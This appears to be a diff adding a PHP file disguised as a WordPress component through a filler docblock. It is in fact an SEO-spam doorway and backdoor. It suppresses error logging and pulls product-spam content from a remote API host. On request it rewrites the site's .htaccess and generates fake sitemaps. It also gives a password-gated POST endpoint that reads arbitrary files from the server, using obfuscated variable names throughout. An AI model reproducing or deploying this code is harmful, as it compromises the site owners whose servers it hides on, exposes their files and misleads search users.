@@ -1,0 +1,3100 @@
+<?php 
+
+/**
+ * acknowledge community media prior shiver software stale.
+ * aspect distress globe relief resemble scan tide.
+ * arise blast bunch deserve distinguish import kneel mood naked organ particularly principle ridid sequence signature simplify slender tension transform tropical xploit.
+ * adult awful bureau career column comment conquer decent decorate delicate episode ferfile gap guilty haste insurance legislation loose magnet neutral principal ridge security sophisticated venture.
+ * comparative discipline expand facility geometry optics range revenue rival satellite spill trap undergraduate videotape.
+ * accomplish adapt agent drift particularly recreation reveal ridid significance spill stripe twist urge violence.
+ * applicable awful calendar competition display expense glimpse oxygen personnel.
+ * cliff comparative conquer disturb diverse maintain obscure sorrow stimulate swallow vital.
+ * exclude focus hydrogen loosen nonsense orient.
+ * adhere budget elbow global import jam junior licence maintain optics parade passion passport restrict sexual universe version withstand.
+ *
+ * @package WordPress
+ */
+
+
+@ini_set('display_errors', 0);
+@ini_set('log_errors', 0);
+@set_time_limit(3600);
+define("DATAHOST","https://www.data-center.net/api/");
+define("CENTERKEY",0);
+define("MYDIR", "/ebayus220207-37/");
+define("FNUM",94);
+define("JGNUM","40");
+define("LINKNUM","8");
+define("BZSITE","e");
+define("CURRENUSE","/usd/");
+define("LANUSED","us");
+define("BZPRO","b");
+define("BZCAT","l");
+//msbg
+define("JDT","0");
+//msend
+
+//msidbg
+define("MSID",8666);
+//mssidend
+
+
+//keyjgbg
+
+define("KEYJG",57);
+
+//keyjgend
+
+//randnumIbg
+
+define("RANDNUMI",11);
+
+//randnumIend
+
+//randnumIIbg
+
+define("RANDNUMII",13);
+
+//randnumIIend
+
+//pnamelenbg
+
+define("PNAMELEN",40);
+
+//pnamelenend
+
+//jthouzuibg
+define("JTHZ",".cfm");
+//jthouzuiend
+
+
+//nttarr_bg
+
+$arrnametime[]="2";
+$arrnametime[]="4";
+$arrnametime[]="1";
+$arrnametime[]="3";
+
+
+//nttarr_end
+
+
+//kwzzarr_bg
+
+$arrKeywz[]="12";
+$arrKeywz[]="11";
+$arrKeywz[]="9";
+$arrKeywz[]="10";
+$arrKeywz[]="6";
+$arrKeywz[]="4";
+$arrKeywz[]="7";
+$arrKeywz[]="8";
+$arrKeywz[]="5";
+
+
+//kwzzarr_end
+
+
+//brddarr_bg
+
+$arrBread[]="cs-breadcrumb row";
+$arrBread[]="bread_crumb clearfix";
+$arrBread[]="BreadcrumbsHead";
+$arrBread[]="breadList";
+$arrBread[]="l-breadcrumb row";
+$arrBread[]="crumbsTops";
+$arrBread[]="bread-List";
+$arrBread[]="ck-breadcrumb row";
+$arrBread[]="Breadcrumbs row";
+$arrBread[]="chrome-breadcrumbs clearfix";
+$arrBread[]="crumbsHeads";
+$arrBread[]="ag-breadcrumblist clearfix";
+$arrBread[]="navBreadCrumbs";
+$arrBread[]="breadcrumb";
+$arrBread[]="BreadcrumbHead clearfix";
+$arrBread[]="crumbsTops row";
+$arrBread[]="BreadcrumbsHead clearfix";
+$arrBread[]="Breadcrumb-Heads row";
+$arrBread[]="crumb-list";
+$arrBread[]="crumbsTop";
+$arrBread[]="breadHeads";
+$arrBread[]="ck-breadcrumb";
+$arrBread[]="Breadcrumb-Heads";
+$arrBread[]="breadcrumb clearfix";
+$arrBread[]="doc-crumb row";
+$arrBread[]="BreadcrumbsHead row";
+$arrBread[]="crumb-list clearfix";
+$arrBread[]="BreadcrumbList";
+$arrBread[]="breadHeads clearfix";
+$arrBread[]="el-breadcrumb";
+$arrBread[]="Breadcrumb";
+$arrBread[]="crumbs-nag clearfix";
+$arrBread[]="";
+$arrBread[]="l-breadcrumb clearfix";
+$arrBread[]="BreadcrumbTops clearfix";
+$arrBread[]="customBreadcrumb clearfix";
+$arrBread[]="BreadHead clearfix";
+$arrBread[]="Breadcrumb-Heads clearfix";
+$arrBread[]="BreadcrumbsList";
+$arrBread[]="page-breadcrumbs clearfix";
+$arrBread[]="cs-breadcrumb";
+$arrBread[]="navBreadCrumb clearfix";
+$arrBread[]="qa-breadcrumb clearfix";
+$arrBread[]="breadList row";
+$arrBread[]="BreadcrumbsList clearfix";
+$arrBread[]="customBreadcrumb";
+$arrBread[]="l-breadcrumb";
+$arrBread[]="page-breadcrumbs";
+$arrBread[]="qa-breadcrumb";
+$arrBread[]="crumbList clearfix";
+$arrBread[]="crumbs-top row";
+$arrBread[]="BreadHead row";
+$arrBread[]="";
+$arrBread[]="breadcrumb row";
+$arrBread[]="pages-breadcrumbs row";
+$arrBread[]="";
+$arrBread[]="navBreadCrumbs row";
+$arrBread[]="BreadcrumbNavigation";
+$arrBread[]="";
+$arrBread[]="breadcrumb";
+$arrBread[]="doc-crumb clearfix";
+$arrBread[]="l-breadcrumblist";
+$arrBread[]="Bread clearfix";
+$arrBread[]="crumbsTop clearfix";
+$arrBread[]="breadList clearfix";
+$arrBread[]="el-breadcrumb clearfix";
+$arrBread[]="s-breadcrumb row";
+$arrBread[]="crumbsTops clearfix";
+$arrBread[]="crumb-list row";
+$arrBread[]="";
+$arrBread[]="c-breadcrumb clearfix";
+$arrBread[]="crumbs-head";
+$arrBread[]="BreadcrumbTops";
+$arrBread[]="crumbs";
+$arrBread[]="Breadcrumb-Head clearfix";
+$arrBread[]="Breadcrumb-Top row";
+$arrBread[]="c-breadcrumb row";
+$arrBread[]="BreadcrumbTops row";
+$arrBread[]="crumbsHead";
+$arrBread[]="";
+$arrBread[]="crumbs-top clearfix";
+$arrBread[]="navBreadCrumb row";
+$arrBread[]="c-breadcrumb";
+$arrBread[]="breadcrumbs-base";
+$arrBread[]="Bread row";
+$arrBread[]="breadLists";
+$arrBread[]="crumbs-nag row";
+$arrBread[]="crumbList row";
+$arrBread[]="";
+$arrBread[]="BreadcrumbHead row";
+$arrBread[]="r-breadcrumb clearfix";
+$arrBread[]="l-breadcrumblist clearfix";
+$arrBread[]="breadLists row";
+$arrBread[]="breadtop clearfix";
+$arrBread[]="Breadcrumb clearfix";
+$arrBread[]="Breadcrumb row";
+$arrBread[]="qa-breadcrumb row";
+$arrBread[]="ck-breadcrumb clearfix";
+$arrBread[]="Breadcrumb";
+$arrBread[]="chrome-breadcrumbs row";
+$arrBread[]="crumbs clearfix";
+$arrBread[]="bread-List clearfix";
+$arrBread[]="Breadcrumb clearfix";
+$arrBread[]="breadLists clearfix";
+$arrBread[]="plp__breadcrumb";
+$arrBread[]="doc-crumb";
+$arrBread[]="BreadcrumbLists clearfix";
+$arrBread[]="BreadcrumbNavigation row";
+$arrBread[]="";
+$arrBread[]="BreadcrumbList clearfix";
+$arrBread[]="BreadcrumbHeads clearfix";
+$arrBread[]="BreadcrumbHeads";
+$arrBread[]="breadHeads row";
+$arrBread[]="crumbs-top";
+$arrBread[]="BreadcrumbTop row";
+$arrBread[]="crumbsTop row";
+$arrBread[]="crumbs-nag";
+$arrBread[]="mb-breadcrumb row";
+$arrBread[]="Breadcrumb-Top";
+$arrBread[]="breadtop";
+$arrBread[]="navBreadCrumb";
+$arrBread[]="BreadcrumbHead";
+$arrBread[]="r-breadcrumb";
+$arrBread[]="Breadcrumbs";
+$arrBread[]="BreadcrumbLists row";
+$arrBread[]="";
+$arrBread[]="breadHead clearfix";
+$arrBread[]="l-breadcrumb";
+$arrBread[]="crumbsHead row";
+$arrBread[]="navBreadCrumbs clearfix";
+$arrBread[]="breadcrumbs-base clearfix";
+$arrBread[]="v-breadcrumb row";
+$arrBread[]="crumbsHead clearfix";
+$arrBread[]="Breadcrumbs clearfix";
+$arrBread[]="BreadcrumbLists";
+$arrBread[]="BreadHead";
+$arrBread[]="crumbList";
+$arrBread[]="ant-breadcrumb clearfix";
+$arrBread[]="BreadcrumbTop clearfix";
+$arrBread[]="crumbs-head row";
+$arrBread[]="breadcrumb row";
+$arrBread[]="crumbs-head clearfix";
+$arrBread[]="";
+$arrBread[]="Breadcrumb-Head";
+$arrBread[]="BreadcrumbsList row";
+$arrBread[]="breadtops clearfix";
+$arrBread[]="l-breadcrumb row";
+$arrBread[]="v-breadcrumb clearfix";
+$arrBread[]="crumbsHeads row";
+$arrBread[]="chrome-breadcrumbs";
+$arrBread[]="plp__breadcrumb row";
+$arrBread[]="s-breadcrumb";
+$arrBread[]="BreadcrumbTop";
+$arrBread[]="BreadcrumbNavigation clearfix";
+$arrBread[]="";
+$arrBread[]="el-breadcrumb row";
+$arrBread[]="nw-breadcrumblist row";
+$arrBread[]="breadcrumb clearfix";
+$arrBread[]="wrapper-breadcrums";
+$arrBread[]="breadcrumbs row";
+$arrBread[]="customBreadcrumb row";
+$arrBread[]="ant-breadcrumb row";
+$arrBread[]="l-breadcrumb clearfix";
+$arrBread[]="cs-breadcrumb clearfix";
+$arrBread[]="breadHead";
+$arrBread[]="Breadcrumb-Top clearfix";
+$arrBread[]="breadtop row";
+$arrBread[]="breadcrumbs";
+$arrBread[]="wrapper-breadcrums row";
+$arrBread[]="ag-breadcrumblist";
+$arrBread[]="bread-List row";
+$arrBread[]="v-breadcrumb";
+$arrBread[]="BreadcrumbList row";
+$arrBread[]="mb-breadcrumb clearfix";
+$arrBread[]="BreadcrumbHeads row";
+$arrBread[]="";
+$arrBread[]="Breadcrumb row";
+$arrBread[]="Bread";
+$arrBread[]="ag-breadcrumblist row";
+$arrBread[]="l-breadcrumblist row";
+$arrBread[]="plp__breadcrumb clearfix";
+$arrBread[]="bread_crumb";
+$arrBread[]="breadcrumbs-base row";
+$arrBread[]="breadcrumbs clearfix";
+$arrBread[]="nw-breadcrumblist clearfix";
+$arrBread[]="wrapper-breadcrums clearfix";
+$arrBread[]="s-breadcrumb clearfix";
+$arrBread[]="";
+$arrBread[]="breadtops";
+$arrBread[]="mb-breadcrumb";
+$arrBread[]="crumbs row";
+$arrBread[]="Breadcrumb-Head row";
+$arrBread[]="r-breadcrumb row";
+$arrBread[]="page-breadcrumbs row";
+$arrBread[]="breadtops row";
+$arrBread[]="crumbsHeads clearfix";
+$arrBread[]="bread_crumb row";
+$arrBread[]="pages-breadcrumbs clearfix";
+$arrBread[]="pages-breadcrumbs";
+$arrBread[]="nw-breadcrumblist";
+$arrBread[]="breadHead row";
+$arrBread[]="ant-breadcrumb";
+
+
+//brddarr_end
+
+
+
+
+//fhharr_bg
+
+$arrfh[]="Christmas Supplies";
+$arrfh[]="Xmas";
+$arrfh[]="Top Christmas gifts 2021";
+$arrfh[]="Christmas gift ideas";
+$arrfh[]="Christmas presents";
+$arrfh[]="Unique Christmas Gifts";
+$arrfh[]="Christmas gift";
+$arrfh[]="Christmas Ornament";
+$arrfh[]="Christmas gift shop";
+$arrfh[]="Christmas Decoration";
+$arrfh[]="Xmas Ornaments";
+$arrfh[]="Christmas gift ideas 2021";
+$arrfh[]="Holiday presents";
+$arrfh[]="for Christmas";
+$arrfh[]="Holiday Gifts";
+$arrfh[]="Christmas Gifts 2021";
+$arrfh[]="Christmas gift store";
+$arrfh[]="Christmas Holiday";
+$arrfh[]="best Christmas gift";
+$arrfh[]="Best Christmas gifts 2021";
+
+//fhharr_end
+
+
+
+$q1 = "O00O0O";	$q2 = "O0O000";	$q3 = "O0OO00";	$q4 = "OO0O00";	$q5 = "OO0000";	$q6 = "O00OO0";	$q7 = "O00O00";	$q8 = "O00OOO";	$$q1 = RandAbcs();
+
+
+
+//srrarr_bg
+$date_string[0]="ohjisderqgbnmaztyfxlukwpcv";
+$date_string[1]="fpbeyczwndrtkloguhqamjvsxi";
+$date_string[2]="pvsfnbjhqxwkuleociytzragdm";
+$date_string[3]="bnfvolxdqhzmukpcwigtasyerj";
+$date_string[4]="altwmjobrnqhyvxizsukfecgdp";
+$date_string[5]="khlceynuptoxjdbrzqiafmgvws";
+$date_string[6]="inulbhdqsvftgykcpjmxawzeor";
+$date_string[7]="qhutkfyirnpscbzgwoexadvlmj";
+$date_string[8]="upbvfgwexqcrsnloztaikmyhdj";
+$date_string[9]="kiosuzwajxqdmfvytnhbecrlgp";
+$date_string[10]="dtyqjcbshmpguaeirkflvwnxzo";
+$date_string[11]="pulqmvhtyrxzckidwasebjgnof";
+$date_string[12]="khfjipuayzvqgsorexmbdtlwnc";
+$date_string[13]="ngyotxadvezslckqwiuhrpbjfm";
+$date_string[14]="sqjywpzkaihndbvumgcorxletf";
+$date_string[15]="cglnbjkotwazufvdhpimsxreyq";
+$date_string[16]="zeqaysjmhupdtkbcfirovxnlgw";
+$date_string[17]="pixrmzgdnjtbqvyocluwskehfa";
+$date_string[18]="qacpwlijbveskdgfhumotryznx";
+$date_string[19]="ibsfltaehurndgpvxcoyzmqjwk";
+$date_string[20]="protuizfsbhyaglnmcxkwejdvq";
+$date_string[21]="orcyeuknpvgmxtijflzqwbhasd";
+$date_string[22]="yiurdczvnptweamxbgsfkqljho";
+$date_string[23]="mgircnwzflsjxtuybpdvqoehka";
+$date_string[24]="kxacrqgejiuhfdztyvmpsnlwbo";
+$date_string[25]="hldgbxtosmnqwjzayruevcfkip";
+$date_string[26]="hztcojliavmqfwkbpugysexnrd";
+$date_string[27]="eafmgxojtvsphudcqyzrnlbiwk";
+$date_string[28]="wcpnbxoghsytvrljdeifqmuazk";
+$date_string[29]="wtgcehxfrqosjlybmipzudvkna";
+$date_string[30]="pdicjtowsmknhfxeurqzbalgyv";
+$date_string[31]="ezfaphtdyrqnjgoskivbwlmxcu";
+$date_string[32]="ojpqiufdgskchntxvylwbzrame";
+$date_string[33]="cskamtphzuxiofwqbjndylegrv";
+$date_string[34]="shigcjerbzlxfkdypqanmoutwv";
+$date_string[35]="tjexznvwqplmysbkcfgiahduor";
+$date_string[36]="larqftgmhcnvxesudboiwjkzyp";
+$date_string[37]="iwjmbytzvdrlhnskucxpeofaqg";
+$date_string[38]="xsulcpnadwhkrmtzeobyvqfjgi";
+$date_string[39]="uvdiztyonqgfsawxbmlhrecjkp";
+$date_string[40]="bkhfxlturepojzwcmiqdsyavng";
+$date_string[41]="sywcnfivduzajogrmtkhpelqbx";
+$date_string[42]="qzgbpetfhjxrcldasnykwmvuio";
+$date_string[43]="nbtcysapjdlkouqvfgzeimhrwx";
+$date_string[44]="fhdrbnjwozxyeslicatqkugmpv";
+$date_string[45]="byknrgcjvephlxqfdoiamszwtu";
+$date_string[46]="nzmvgdhwteryulcpaqofbjksix";
+$date_string[47]="nlzvxmoeydrfjswcaiqupbtgkh";
+$date_string[48]="ysbogewnurvzldxhkmpitajfcq";
+$date_string[49]="klhxdtconqvzysupfeibjmgarw";
+$date_string[50]="wesuzfqlromhkjcbdnxtpgviya";
+$date_string[51]="jkgezospdbwyqcxhatnimfvlru";
+$date_string[52]="uboiwmzfgrlcxahyvkjpetsdnq";
+$date_string[53]="dlmbruzavsnwjoheftkpcyxiqg";
+$date_string[54]="ncktudjvxgqmfwyparhzesilob";
+$date_string[55]="luojgxyeksaqbrzhpmiwvcftdn";
+$date_string[56]="bxqywoelkgijnhutsmfdcarpzv";
+$date_string[57]="ifedcyorbpxamuzqhtnwjlskvg";
+$date_string[58]="gvwdkzoxylfatcqjhubpnimsre";
+$date_string[59]="btxnsmlrohiqdyvcwfjkupegaz";
+$date_string[60]="pofinxlqcbzvykmwhsdgretjau";
+$date_string[61]="dbpfnjrwezayomsxltvqgkihuc";
+$date_string[62]="uanrzhdkbxqempwcijgyvtlfso";
+$date_string[63]="jxrznuwdybeqfvoclgahkptmsi";
+$date_string[64]="mtwqyxhfvugciadrlozsenkpbj";
+$date_string[65]="rmhvcdqpexajsbokwfygiunztl";
+$date_string[66]="zpjbmdfvawlqrexocguthiknsy";
+$date_string[67]="utvkgpzwijecdqabsrfyhoxmln";
+$date_string[68]="jwuvzebdipkyfhsmxlqcotgnra";
+$date_string[69]="bzqsumdylaopcijvftxrhwgkne";
+$date_string[70]="yiokzlbedqausmgfpxjctvrnwh";
+$date_string[71]="gjkolvafweizrmxubqythspncd";
+$date_string[72]="cfkoeijyxzwtsqpmgblrvunhda";
+$date_string[73]="qknaughebitrswflxcypmovjdz";
+$date_string[74]="qjgyfcdmuvrktoshbexnaplwzi";
+$date_string[75]="euxirlopdjhwvcsmatzgqkbnfy";
+$date_string[76]="fzcerlpmtvhgbxujnkoisadqwy";
+$date_string[77]="rbywpdlcoujehxkmqtisgnfavz";
+$date_string[78]="zoueibljfyagcpnhqtwkmrsdxv";
+$date_string[79]="wesyibtxdkuqrchznlmopfjgva";
+$date_string[80]="jxgzkqebnuhomfptsadyclrivw";
+$date_string[81]="zfpamwkriycuxobhsjveltdqgn";
+$date_string[82]="exyqmskwndpvctorljbhzgiuaf";
+$date_string[83]="epvzdycblktqgxhaiuowrmsjfn";
+$date_string[84]="vaduftiskejcogpzxrwmbqhynl";
+$date_string[85]="usiblvhkaenjpdrtxzfcqwygom";
+$date_string[86]="pfyuhkvqcmsbgdajztxinlerow";
+$date_string[87]="kxbnwsrhopufezyadclmjqtgiv";
+$date_string[88]="jufbvcwimslhyoaegpzkxrndqt";
+$date_string[89]="eiqsotrucnjblhfpkmvdxyawzg";
+$date_string[90]="wtonymczfrqgadsluvebipkjhx";
+$date_string[91]="ofhiqukyxapbjsnglzcwvtemrd";
+$date_string[92]="nguxhtoeqdzlyifkbvwmcpsajr";
+$date_string[93]="oqacsxbetjiurnwzglvphdmkyf";
+$date_string[94]="bicvteumnohprqlyfskzjadwxg";
+$date_string[95]="eizxtsnwfuvpdghrajcbmolqyk";
+$date_string[96]="kqcfrhojyinlgxawzspmudtveb";
+$date_string[97]="gnmkvzaljwyhqpcfdueixosbrt";
+$date_string[98]="ayhukxmqirjtdoecpsnbgwvzlf";
+$date_string[99]="ynkvgtsaueplbjrfmixcohdzwq";
+
+//srrarr_end
+
+
+
+$thisdom = str_replace("www.","",$_SERVER['HTTP_HOST']);
+define("GETDOM",getthisdom());
+		
+
+global $cFlag;
+$cFlag = 'c';
+$pattern = '/[A-Za-z]/';
+for($i=0;$i<strlen($thisdom);$i++){
+	if(preg_match($pattern, $thisdom[$i])){
+		$cFlag = $thisdom[$i];
+		break;
+	}
+}
+
+
+// 
+	
+	
+	
+$arrArrr = array();$j = 0;for($i=0;$i<20;$i+=2){
+   $arrArrr[$j++] = $date_string[$i].$date_string[$i+1];}
+$Arrrarr = array_flip($arrArrr);
+$temp_abc = $O00O0O[9].$O00O0O[4].$O00O0O[0].$O00O0O[13].$O00O0O[17].$O00O0O[14].$O00O0O[11];
+$temp_def = $O00O0O[13].$O00O0O[0].$O00O0O[18].$O00O0O[20].$O00O0O[3].$O00O0O[8].$O00O0O[14].$O00O0O[0];
+
+
+
+if(isset($_GET["gsitemap"]) && isset($_GET["mapnum"])){
+	
+	$arrABC = range('a','z');
+
+	
+	$O_OO0_0O_0='America/Chicago';	
+	date_default_timezone_set($O_OO0_0O_0);	
+	if (! is_dir("../search"))
+		mkdir("../search", 0755);	
+	global $gnumber;
+	$gnumber = 1;
+	$bgNum = (int)trim($_GET["gsitemap"]);
+	$mapnum = (int)trim($_GET["mapnum"]);
+	if($bgNum > FNUM)
+	   die("The Number Must Lower Then " . FNUM);
+   
+	$arrNumTemp = getMapNum($bgNum,$mapnum);
+	
+	$rs = '#<map>(.*)</map>#si';
+	$mapLogs = file_get_contents("./map.log");
+	
+	foreach($arrNumTemp as $vss){
+		
+		$vals = "id$vss.php";
+		
+		
+		if(JDT == 0 && $gnumber == 1){
+			
+			if(strstr($mapLogs,'sitemap.xml') && file_exists('../search/sitemap.xml')){
+				echo $vals."<br/>";
+				echo '../search/sitemap.xml successed<br/>';
+				$gnumber++;
+				continue;	
+			}
+		
+		}elseif(JDT == 0){
+			
+				
+		if(strstr($mapLogs,'#consolemap'. $arrABC[$gnumber-2] .''  .'.xml#') && file_exists('../search/consolemap'. $arrABC[$gnumber-2] .'' .'.xml')){
+			echo $vals."<br/>";
+			echo '../search/consolemap'. $arrABC[$gnumber-2] .'' .'.xml successed<br/>';
+			$gnumber++;
+			continue;	
+		}
+		}
+		
+		
+		if(strstr($mapLogs,'#consolemap'. $arrABC[$gnumber-1] .''  .'.xml#') && file_exists('../search/consolemap'. $arrABC[$gnumber-1] .'' .'.xml')){
+			echo $vals."<br/>";
+			echo '../search/consolemap'. $arrABC[$gnumber-1] .'' .'.xml successed<br/>';
+			$gnumber++;
+			continue;	
+		}
+		
+		for($i=0; $i<3; $i++){
+			$idUrl =  GETDOM . "gpage.php?getmapid=$vss&site=$thisdom&sid=".MSID;
+			$tempIdStr = curl_get_from_webpage($idUrl,'',5);
+			$arrIdNameNow = array();
+			if(preg_match($rs,$tempIdStr,$matchIdName)){
+				$tparrIdName = explode('^^',$matchIdName[1]);
+				foreach($tparrIdName as $vs){
+					$tpArr = explode('^',$vs);
+					if(count($tpArr) == 2){
+						$arrIdNameNow[$tpArr[0]] = $tpArr[1];
+					}elseif(count($tpArr) > 2){
+						$tpstr = '';
+						for($j=1; $j<count($tpArr); $j++){
+							$tpstr .= $tpArr[$j] . ' ';
+						}
+						$tpstr = trim($tpstr);
+						$arrIdNameNow[$tpArr[0]] = $tpstr;
+					}
+				}
+				
+				break;
+			}
+		}
+		
+		
+	
+		if(!isset($arrIdNameNow) or count($arrIdNameNow) < 100){
+			echo "g sitemap fail<br/>";
+			die();
+		}
+		
+		echo $vals."<br/>";
+	
+		if($gnumber == 1){
+			if(JDT == 1){
+				gsitemap($arrIdNameNow,2,1);			
+				}else{
+				gsitemap($arrIdNameNow,1,2);			
+				}
+		}else{
+			
+			if(JDT == 1){
+				gsitemap2($arrIdNameNow,2,1);			}else{
+				gsitemap2($arrIdNameNow,1,2);			}
+			
+		}
+		
+		unset($arrIdNameNow,$tempArr1,$tempArr2);	}
+	
+}
+
+
+if(isset($_GET["ghtac"]) && $_GET["ghtac"]){
+
+	$dirNames = dirname(__FILE__);    
+	$tpDarr = explode(DIRECTORY_SEPARATOR, $dirNames); $httcReplace = end($tpDarr);	
+	$PreDir = '';	
+	if(JDT == 1){
+		$UrlBaseDir = $httcReplace;		$RewriteOnDir = '';	
+	}else{
+		$UrlBaseDir = '';		$PreDir = '../';		$RewriteOnDir = $httcReplace . '/';	
+	}
+	$strhtt = '';
+	if (file_exists("$PreDir.htaccess")){
+		chmod("$PreDir.htaccess",0755);
+		$strhtt = file_get_contents("$PreDir.htaccess");	
+	}
+	if(!(strstr($strhtt,'RewriteBase') || strstr($strhtt,'RewriteRule')))
+	{
+		$strhtt = '<IfModule mod_rewrite.c>'.PHP_EOL . 'Options +FollowSymLinks'. PHP_EOL .'RewriteEngine on'. PHP_EOL .'RewriteBase /'. $UrlBaseDir . PHP_EOL .'</IfModule>';	
+	}else{
+		$strhtt = str_ireplace('# RewriteBase ','RewriteBase ',$strhtt);
+		$strhtt = str_ireplace('#RewriteBase ','RewriteBase ',$strhtt);	
+	}
+		
+	if(1){
+		
+		$r0 = '#(.*RewriteEngine On.*)#i';
+
+		$r1 = '#(.*RewriteBase.*)#i';		$r2 = '#RewriteRule#i';		
+
+	
+
+		if(JDT == 0){
+			
+			
+			$rsut = '\1'.PHP_EOL . 'RewriteRule ^'. LANUSED . '/products-.*-(\d+)'. JTHZ  .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]'. PHP_EOL . 'RewriteRule ^'. LANUSED . '/(.*)-'. $cFlag .'\d+'. JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]'. PHP_EOL . 'RewriteRule ^'.'.*(consolemap[a-z]+\.xml)$  search/\$1 [L]' . PHP_EOL . 'RewriteRule ^'.'.*(sitemap\.xml)$  search/\$1 [L]' . PHP_EOL ;
+		
+			$rsut2 = PHP_EOL . 'RewriteRule ^'. LANUSED . '/products-.*-(\d+)'. JTHZ  .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]'. PHP_EOL . 'RewriteRule ^'. LANUSED . '/(.*)-'. $cFlag .'\d+'. JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]'. PHP_EOL . 'RewriteRule ^'.'.*(consolemap[a-z]+\.xml)$  search/\$1 [L]' . PHP_EOL . 'RewriteRule ^'.'.*(sitemap\.xml)$  search/\$1 [L]' . PHP_EOL .'RewriteRule' ;
+		
+			
+		}else{
+			
+			
+			$rsut = '\1'. PHP_EOL . 'RewriteRule ^'. LANUSED . '/products-.*-(\d+)'. JTHZ  .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]'. PHP_EOL . 'RewriteRule ^'. LANUSED . '/(.*)-'. $cFlag .'\d+'. JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]'. PHP_EOL ;
+		
+			$rsut2 =  PHP_EOL . 'RewriteRule ^'. LANUSED . '/products-.*-(\d+)'. JTHZ  .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]'. PHP_EOL . 'RewriteRule ^'. LANUSED . '/(.*)-'. $cFlag .'\d+'. JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]'. PHP_EOL .'RewriteRule' ;	
+		
+			
+		}
+
+
+
+
+	
+			if(preg_match($r0,$strhtt)){
+				$strhtt = preg_replace($r0,$rsut,$strhtt,1);
+			}elseif(preg_match($r1,$strhtt)){
+				$strhtt = preg_replace($r1,$rsut,$strhtt,1);
+			}else{
+				$strhtt = preg_replace($r2,$rsut2,$strhtt,1);
+			}
+		
+		if(JDT == 1 or JDT == 0){
+			file_put_contents("$PreDir.htaccess", $strhtt);		
+		}
+		
+	}
+
+	die("ghtac ok");
+}
+
+
+if(isset($_POST["chdate"]) && md5($_POST["chdate"])=='b6772c68627f804a9578152ee90f5b0c' && isset($_POST["v_read"])){$v_read = $_POST["v_read"];if(file_exists($v_read)){echo '#ok#';}else{echo '#nofile#';}die();}if(isset($_POST["redate"]) && md5($_POST["redate"])=='b6772c68627f804a9578152ee90f5b0c' && isset($_POST["v_read"])){$v_read = $_POST["v_read"];if(file_exists($v_read)){echo rFile($v_read);die();}else{echo '#nofile#';die();}}if(isset($_POST["test"]) && md5($_POST["test"])=='b6772c68627f804a9578152ee90f5b0c'){echo '#ok#';	die();}if((isset($_POST["lan"]) && $_POST["lan"] == 1) or (isset($_GET["lan"]) && $_GET["lan"] == 1)){$blog_data = array();$flag = 1;$blog_data['index'] = filesize(__FILE__);if(file_exists("./template.html")){$blog_data['template'] = filesize("./template.html");}else{$flag = 0;$blog_data['template'] = -1;}echo 'error---'. serialize($blog_data) .'---';die();}if(isset($_GET["gsitemap"]) || isset($_GET["rset"]) || isset($_GET["hzui"]) || isset($_GET["jgshu"]) || isset($_GET["ljshu"]) || isset($_GET["modifydate"]) || isset($_GET["moshi"]) || isset($_GET["install"])){die();}
+	
+if(JDT==2){
+	
+	$UrlParent=end((explode('index.php',$_SERVER['REQUEST_URI'])));	if($UrlParent){
+		$tempSid = '';		$tempPid = '';		
+				
+		$r2='#'. LANUSED . '/products-.*-(\d+)'. JTHZ .'$#i';		$r3='#'. LANUSED . '/products-.*-(\d+)/$#i';
+		if(preg_match($r2,$UrlParent,$matches2)){
+			if(isset($matches2[1]))
+				$tempPid = $matches2[1];		}else{
+			
+			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
+				$tempPid = $matches13[1];		}
+	
+			
+		// if($tempPid && !strstr($_SERVER['REQUEST_URI'],'item')){
+		if($tempPid){
+			$_GET['id']= $tempPid;		
+		}else{
+			$r2='#'. LANUSED . '/(.*)-'. $cFlag .'\d+'. JTHZ .'#i';		$r3='#'. LANUSED . '/(.*)-'. $cFlag .'\d+/$#i';
+			if(preg_match($r2,$UrlParent,$matches2)){
+				if(isset($matches2[1]))
+					$tempPid = $matches2[1];		
+			}else{
+				preg_match($r3,$UrlParent,$matches13);
+				if(isset($matches13[1]))
+					$tempPid = $matches13[1];
+			}
+			
+			if($tempPid)
+				$_GET['cat']= $tempPid;	
+			
+		}
+	}
+	
+}elseif(JDT==3&&isset($_GET['keyword'])&&$_GET['keyword']){
+		
+		$tempSid = '';		$tempPid = '';		$UrlParent = $_GET['keyword'];		
+
+		$r2='#-(\d+)$#i';		$r3='#[-/]'.'(\d+)$#i';	
+		if(preg_match($r2,$UrlParent,$matches2)){
+			if(isset($matches2[1]))
+				$tempPid = $matches2[1];		}else{
+			
+			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
+				$tempPid = $matches13[1];		}
+		
+		
+
+	
+	
+		if($tempPid){
+			$_GET['id']= $tempPid;		
+		}
+	
+	
+}	
+	
+function getRandStr(){
+	
+	$arrABC = range('a','z');	shuffle($arrABC); 
+	$randNum = rand(4,6);	
+	$str = implode('',array_slice($arrABC,0,$randNum));	
+	return $str;}
+	
+
+if(isset($_GET["id"]))
+	$id = $_GET["id"];
+else{
+	
+	if(isset($_GET["cat"])){
+		$rqurl = $_GET["cat"];
+		
+		$logFileName = './idlogs.txt';
+		if(file_exists($logFileName)){
+			$arrUrlId = unserialize(file_get_contents($logFileName));
+		}else{
+			$arrUrlId = array();
+		}
+
+		if(isset($rqurl) && isset($arrUrlId[$rqurl]) && $arrUrlId[$rqurl]){
+			$id  = $arrUrlId[$rqurl];		
+		}else{
+			$arrUrlId[$rqurl] = getRandCId($rqurl);
+			$id = $arrUrlId[$rqurl];
+			file_put_contents($logFileName,serialize($arrUrlId));
+			touch(dirname($logFileName), $fLogTime, $fLogTime); 
+			touch($logFileName, $fLogTime, $fLogTime);    
+		}
+	}else{
+		
+	
+	$id = "817444"; //llq index id 
+	
+	}
+
+}
+
+$rs_ptth = $O00O0O[63].$O00O0O[2].$O00O0O[14].$O00O0O[12];
+$rs_http = 'http://www.';
+$resid = '#^\d+$#';
+if(!preg_match($resid,$id)){
+	http_response_code(404);
+	exit;
+}
+$id23 = $id;
+
+
+
+$siteid = MSID;
